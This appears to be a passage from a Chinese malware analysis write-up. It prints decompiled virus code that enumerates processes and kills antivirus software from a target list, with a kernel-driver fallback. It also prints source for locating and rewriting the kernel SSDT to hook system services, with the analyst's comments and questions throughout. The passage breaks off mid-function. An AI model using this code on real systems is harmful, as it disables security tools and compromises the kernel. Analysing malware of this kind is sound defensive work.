
`PROCESSENTRY32 pe;` // `[sp+4h] [bp-23Ch]@2`

`DWORD v2;` // `[sp+12Ch] [bp-114h]@1`

`HANDLE hObject;` // `[sp+130h] [bp-110h]@1`

`int i;` // `[sp+134h] [bp-10Ch]@1`

`int v5;` // `[sp+138h] [bp-108h]@1`

`char v6;` // `[sp+13Ch] [bp-104h]@1`

`char v7;` // `[sp+13Dh] [bp-103h]@1`

`__int16 v8;` // `[sp+23Dh] [bp-3h]@1`

`char v9;` // `[sp+23Fh] [bp-1h]@1`

`i = 0;`

`v5 = 0;`

`v2 = 0;`

`v6 = 0;`

`memset(&v7, 0, 0x100u);`

`v8 = 0;`

`v9 = 0;`

`hObject = CreateToolhelp32Snapshot(2u, 0);`

`if ( hObject )`
`{`
  `memset(&pe.cntUsage, 0, 0x124u);`
  `pe.dwSize = 296;`
  `if ( Process32First(hObject, &pe) )`
  `{`
    `CharUpperA(pe.szExeFile);`
    `for ( i = 0; *strSafeSoft[i]; ++i )`
    `{`
      `if ( compareString(pe.szExeFile, strSafeSoft[i]) )`
      `{`
        `terminateSoftyProccess(pe.th32ProcessID);`
        `v2 = pe.th32ProcessID;`
        `Sleep(0x400u);`
        `break;`
      `}`
    `}`
    `if ( pe.th32ProcessID != v2 )` // 保护自己的进程
    `{`
      `if ( FindDWEBIO(pe.th32ProcessID) )`
      `{`
        `terminateSoftyProccess(pe.th32ProcessID);`
        `v2 = pe.th32ProcessID;`
        `Sleep(0x400u);`
      `}`
    `}`
  `}`

`LABEL_11:`
`while ( Process32Next(hObject, &pe) )`
`{`
  `CharUpperA(pe.szExeFile);`
  `if ( pe.th32ProcessID != v2 )`
  `{`
    `if ( FindDWEBIO(pe.th32ProcessID) )`
    `{`
      `terminateSoftyProccess(pe.th32ProcessID);`
      `v2 = pe.th32ProcessID;`
      `Sleep(0x400u);`
    `}`
    `else`
    `{`
      `for ( i = 0; *strSafeSoft[i]; ++i )`
      `{`
        `if ( compareString(pe.szExeFile, strSafeSoft[i]) )`
        `{`
          `terminateSoftyProccess(pe.th32ProcessID);`
          `v2 = pe.th32ProcessID;`
          `Sleep(0x400u);`
          `goto LABEL_11;`
        `}`
      `}`
    `}`
  `}`
`}`

```c
ps:在对杀软处理时，基本采取 开辟 两线程 死循环 运行 r0 r3 结合 ，如果 r3 层关不掉 交给 病毒挂在的驱动继续 记住 pid 关闭看这里
WriteFile(v3, &Buffer, 4u, &NumberOfBytesWritten, 0);// 如果没有成功内核来搞定，记录 pid
result = (void *)CloseHandle(v3);
```

大家也可以看看 `getSSDTENtryBak()` 这个函数 可能作者也是抄袭的 ，哎~~~~

他是想通过 `r3` 层获取 `ssdt` 表 ，对内核 直接修改，当自己驱动挂载上去，就是一份 修改后的表，达到 `hook` 的目的 ，下面是我找到的源码 ，其实 很有意思，但我基本 已经恢复了 ，顺便提一下 ，如果是 `ida` 搞清楚 `pe` 结构后 ，记住一定要用结构体 对 反编译的代码 进行还原，这样，代码会很容易恢复出来

### 获取 `KeSSdt` 源码

`ps:这个病毒编写者很懒`

```c
void ReSSDT( IN HANDLE hDriver)    
{    
    HMODULE    hKernel;    
    DWORD    dwKSDT;             // rva of KeServiceDescriptorTable     
    DWORD    dwKiServiceTable;    // rva of KiServiceTable     
    PMODULES    pModules=(PMODULES)&pModules;    
    DWORD    dwNeededSize,rc;    
    DWORD    dwKernelBase,dwServices=0;    
    PCHAR    pKernelName;    
    PDWORD    pService;    
    PIMAGE_FILE_HEADER    pfh;    
    PIMAGE_OPTIONAL_HEADER    poh;    
    PIMAGE_SECTION_HEADER    psh;    
    FARPROC NtQuerySystemInformationAddr=GetProcAddress(GetModuleHandle("ntdll.dll"),"NtQuerySystemInformation");    
    // get system modules - ntoskrnl is always first there,   
    rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,4,&dwNeededSize);    
             if (rc==STATUS_INFO_LENGTH_MISMATCH)       {    
        pModules=(MODULES *)GlobalAlloc(GPTR,dwNeededSize);     
             rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,dwNeededSize,NULL);    
    }  
    else  
    {    
      strange:    
        printf("strange NtQuerySystemInformation()!\n");    
        return;    
    }    
    if (!NT_SUCCESS(rc)) goto strange;   //不成功则退出
    // imagebase     
    dwKernelBase=(DWORD)pModules->smi.Base;        
    // filename - it may be renamed in the boot.ini     
    pKernelName=pModules->smi.ModuleNameOffset+pModules->smi.ImageName;         
    // map ntoskrnl - hopefully it has relocs     
    hKernel=LoadLibraryEx(pKernelName,0,DONT_RESOLVE_DLL_REFERENCES);    //加载模块
    if (!hKernel) {    
        printf("Failed to load! LastError=%i\n",GetLastError());    
        return;           
    }    
    GlobalFree(pModules);    //释放空间
    // our own export walker is useless here - we have GetProcAddress :)         
    if (!(dwKSDT=(DWORD)GetProcAddress(hKernel,"KeServiceDescriptorTable")))  
  {   //试图获取模块中的 ssdt 表基址,这里已经获取了地址
        printf("Can't find KeServiceDescriptorTable\n");    
        return;    
    }    
    // get KeServiceDescriptorTable rva     
    dwKSDT-=(DWORD)hKernel;      // find KiServiceTable     
    if (!(dwKiServiceTable=FindKiServiceTable(hKernel,dwKSDT)))  
  {   //在模块中寻找 ssdt 表偏移地址为啥这里又去寻找 ssdt 表的地址了？
        printf("Can't find KiServiceTable...\n");    
        return;    
    }    
    printf("&KiServiceTable==%08X\n\nDumping 'old' ServiceTable:\n\n",dwKiServiceTable+dwKernelBase);        
    // let's dump KiServiceTable contents           
    // MAY FAIL!!!     
    // should get right ServiceLimit here, but this is trivial in the kernel mode     
    GetHeaders((PCHAR)hKernel,&pfh,&poh,&psh);        //获取文件头信息
    for (pService=(PDWORD)((DWORD)hKernel+dwKiServiceTable);   //基址+偏移
            *pService-poh->ImageBase<poh->SizeOfImage;    
            pService++,dwServices++)    
    {    
        ULONG ulAddr=*pService-poh->ImageBase+dwKernelBase;   //kernel 库文件中服务绝对地址-文件的基址+kernel 库文件的基址=相当于 kernel 文件基址的绝对地址
        SetProc( hDriver,dwServices, &ulAddr );               //通过驱动命令修改函数地址
        //printf("%08X\n",ulAddr);         
    }    
    printf("\n\nPossibly KiServiceLimit==%08X\n",dwServices);    
    FreeLibrary(hKernel);    
}    
DWORD FindKiServiceTable(HMODULE hModule,DWORD dwKSDT)  //模块句柄，SSTD 表偏移地址   
{    
    PIMAGE_FILE_HEADER    pfh;    
    PIMAGE_OPTIONAL_HEADER    poh;    
    PIMAGE_SECTION_HEADER    psh;    
    PIMAGE_BASE_RELOCATION    pbr;    
    PIMAGE_FIXUP_ENTRY    pfe;        
    DWORD    dwFixups=0,i,dwPointerRva,dwPointsToRva,dwKiServiceTable;    
    BOOL    bFirstChunk;    
    GetHeaders((PCHAR)hModule,&pfh,&poh,&psh);    
  //获取模块 dll 的文件头信息,返回数据目录的绝对地址到 psh,poh 为文件头绝对地址，pfh 为 pe 标志绝对地址
    // loop thru relocs to speed up the search     
    if ((poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) &&    
        (!((pfh->Characteristics)&IMAGE_FILE_RELOCS_STRIPPED)))
  {   
        pbr=(PIMAGE_BASE_RELOCATION)RVATOVA(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,hModule);    
               bFirstChunk=TRUE;    
        // 1st IMAGE_BASE_RELOCATION.VirtualAddress of ntoskrnl is 0     
        while (bFirstChunk || pbr->VirtualAddress) {   //
            bFirstChunk=FALSE;    
            pfe=(PIMAGE_FIXUP_ENTRY)((DWORD)pbr+sizeof(IMAGE_BASE_RELOCATION));    
这里 pfe 已经指向 IMAGE_BASE_RELOCATION 结构之后的另一个区段了？
            for (i=0;i<(pbr->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))>>1;i++,pfe++) {    
                if (pfe->type==IMAGE_REL_BASED_HIGHLOW)  
          {   这里怎么能取本区段 IMAGE_BASE_RELOCATION 结构内的 typeoffset 里的类型？,下一个区段的？又不像
                    dwFixups++;    
                    dwPointerRva=pbr->VirtualAddress+pfe->offset;    
                    // DONT_RESOLVE_DLL_REFERENCES flag means relocs aren't fixed     
                    dwPointsToRva=*(PDWORD)((DWORD)hModule+dwPointerRva)-(DWORD)poh->ImageBase;    
                    // does this reloc point to KeServiceDescriptorTable.Base?     
                    if (dwPointsToRva==dwKSDT) {    
                        // check for mov [mem32],imm32. we are trying to find     
                        // "mov ds:_KeServiceDescriptorTable.Base, offset _KiServiceTable"     
```
